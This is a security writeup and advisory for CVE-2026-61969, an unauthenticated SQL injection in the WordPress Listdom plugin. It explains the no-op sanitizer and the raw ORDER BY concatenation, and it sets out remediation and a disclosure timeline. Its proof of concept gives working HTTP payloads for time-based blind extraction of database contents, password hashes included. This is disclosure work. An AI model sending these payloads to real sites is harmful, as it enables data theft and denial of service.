---
title: "Unauthenticated SQLi in Listdom"
date: 2026-09-18
draft: false
aliases:
  - /posts/listdom-sqli/
  - /posts/blog/cve-2026-61969/
description: "CVE-2026-61969: unauthenticated SQL injection in the WordPress Listdom plugin through 5.6.0 via the meta_type sort parameter."
summary: "Unauthenticated SQL injection in Listdom <= 5.6.0 via the meta_type sort parameter. Assigned CVE-2026-61969."
technologies: ["wordpress", "listdom", "php", "mariadb"]
vulnerabilities: ["sqli"]
---

# A Sanitizer That Sanitizes Nothing

**CVE-2026-61969**

## At a glance

| Field | Value |
|---|---|
| CVE | [CVE-2026-61969](https://www.cve.org/CVERecord?id=CVE-2026-61969) |
| Software type | Plugin |
| Software name | Listdom (Business Directory & Listings) |
| Slug | [`listdom`](https://wordpress.org/plugins/listdom/) |
| Affected version | `<= 5.6.0` (latest at time of testing) |
| Fixed | `5.7.0` |
| Vulnerability type | CWE-89 (SQL Injection) |
| CVSS | **9.3, Critical** · `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:N/A:L` |
| Required privilege | None (unauthenticated) |

## Required privilege

None. The endpoints are registered for unauthenticated visitors (`wp_ajax_nopriv_*`) and require no nonce.

## Description

Listdom registers several front-end AJAX actions for unauthenticated users, including `lsd_grid_load_more`, `lsd_grid_sort`, `lsd_listgrid_load_more`, `lsd_listgrid_sort`, and `lsd_ajax_search`. These actions are handled by `LSD_Skins::filter()` (and `LSD_Ajax::search()`), which build a listings query from the attacker-supplied `atts` array.

`app/includes/skins/grid.php`
```php
add_action( 'wp_ajax_lsd_grid_load_more',        array( $this, 'filter' ) );
add_action( 'wp_ajax_nopriv_lsd_grid_load_more', array( $this, 'filter' ) );  // unauthenticated
add_action( 'wp_ajax_lsd_grid_sort',             array( $this, 'filter' ) );
add_action( 'wp_ajax_nopriv_lsd_grid_sort',      array( $this, 'filter' ) );  // unauthenticated
```

The sort configuration is taken directly from request input. In `LSD_Skins::sort()`:

`app/includes/skins.php`
```php
$this->sorts = $this->atts['lsd_sorts'] ?? LSD_Options::defaults('sorts');
// ...
$this->sort_meta_type = isset($option['meta_type']) && trim($option['meta_type'])
    ? $option['meta_type'] : null;   // attacker-controlled
```

The intended sanitizer in `filter()` is a no-op, because `array_walk_recursive` passes values by value and the sanitized copies are discarded:

```php
$atts = $_POST['atts'] ?? [];
array_walk_recursive($atts, 'sanitize_text_field'); // result is thrown away; $atts is used as-is
```

The unsanitized `meta_type` then reaches a raw `ORDER BY` clause through a `posts_clauses` filter, which bypasses WordPress core's `WP_Query::parse_orderby()` allow-list entirely:

```php
public function apply_sort_meta_clauses(array $clauses, WP_Query $wp_query): array {
    // ...
    $meta_type = $this->sort_meta_type;
    // ...
    $sanitized_type = strtoupper(preg_replace('/[^A-Z0-9_(), ]/', '', $meta_type));
    // ...
    $value_expression = "CAST($alias.meta_value AS $sanitized_type)"; // direct concatenation
    // ...
    $clauses['orderby'] = /* ... */ . $value_expression . /* ... */;
    return $clauses;
}
```

The character filter still permits letters, digits, `_`, `(`, `)`, `,`, and space. That is enough to break out of the `CAST(... AS ...)` expression and append arbitrary SQL functions such as `SLEEP()`, `IF()`, `CASE`, `SUBSTRING()`, and `ASCII()`, enabling time-based blind SQL injection and char-by-char data extraction. No string literals or comparison operators are needed, because `IN (...)` performs comparisons against integer values.

## Proof of Concept

Prerequisite: a published Listdom listing exists on the site (the normal state of any live directory), so the `ORDER BY` clause is evaluated against at least one row. No authentication, cookies, or nonce are required.

**Step 1. Confirm the injection (time-based):**
```http
POST /wp-admin/admin-ajax.php HTTP/1.1
Host: TARGET
Content-Type: application/x-www-form-urlencoded

action=lsd_grid_load_more&atts[lsd_sorts][default][orderby]=lsd_x&atts[lsd_sorts][options][lsd_x][meta_type]=DECIMAL)%20END,%20CASE%20WHEN%20SLEEP(5)%20THEN%201%20ELSE%20(1
```

The `meta_type` value decodes to `DECIMAL) END, CASE WHEN SLEEP(5) THEN 1 ELSE (1`. The server takes about 5 seconds to respond, a `SLEEP(0)` control responds immediately, and response time tracks the `SLEEP` argument linearly (2s, 4s, 6s).

Captured query (from the DB log):
```sql
... ORDER BY CASE WHEN lsd_sort_meta.meta_value IS NULL OR lsd_sort_meta.meta_value = ''
        THEN 1 ELSE 0 END ASC,
    CASE WHEN lsd_sort_meta.meta_value IS NULL OR lsd_sort_meta.meta_value = ''
        THEN NULL ELSE CAST(lsd_sort_meta.meta_value AS DECIMAL) END,
    CASE WHEN SLEEP(5) THEN 1 ELSE (1) END DESC,
    wp_posts.post_date DESC, wp_posts.ID DESC LIMIT 0, 12
```

**Step 2. Extract database content (blind):**
```
meta_type = DECIMAL) END, CASE WHEN IF(ASCII(SUBSTRING(VERSION(),1,1)) IN (49),SLEEP(4),SLEEP(0)) THEN 1 ELSE (1
```

Observed against MariaDB 10.6: `IN (49)` (matches `1`) takes about 4 seconds (TRUE); `IN (48)` is immediate (FALSE). Iterating offset and candidate ASCII codes reads arbitrary SQL expressions (`VERSION()`, `DATABASE()`, `USER()`, subqueries). `INFORMATION_SCHEMA` is reachable on all deployments; on case-insensitive deployments the same technique extracts user table data such as password hashes.

## Impact

An unauthenticated attacker can execute arbitrary SQL read queries against the WordPress database and exfiltrate its contents (user records, password hashes, secrets) via blind extraction, and can cause denial of service with `SLEEP`/heavy expressions. No account and no user interaction.

## Suggested remediation

1. Do not interpolate `meta_type` (or any request value) into SQL. Validate it against a fixed allow-list of SQL cast types (`CHAR`, `DECIMAL`, `SIGNED`, `UNSIGNED`, `DATE`, `DATETIME`, `TIME`) and reject anything else.
2. Avoid building `ORDER BY` through a raw `posts_clauses` string. Where a custom order is required, use parameterized fragments and a strict allow-list of column/meta keys.
3. Fix the no-op sanitizer in `filter()` (assign the result back). Defense in depth, not a substitute for item 1.

Update Listdom to **5.7.0 or later**.

## Discovery

Independent security research. A self-contained reproduction (Dockerized WordPress 6.6 / PHP 8.2 / MariaDB 10.6 with Listdom 5.6.0) and request/response timing evidence are retained by the reporter and available on request.

Reported through the Patchstack Bug Bounty Program.

- Reported: 29 Jun 2026
- Fixed: 5.7.0
- CVE published: 13 Aug 2026
- Writeup published: 18 Sep 2026
- CVE: [CVE-2026-61969](https://www.cve.org/CVERecord?id=CVE-2026-61969)
- Advisory: [Patchstack](https://patchstack.com/database/wordpress/plugin/listdom/vulnerability/wordpress-listdom-plugin-5-6-0-sql-injection-vulnerability?_s_id=cve)
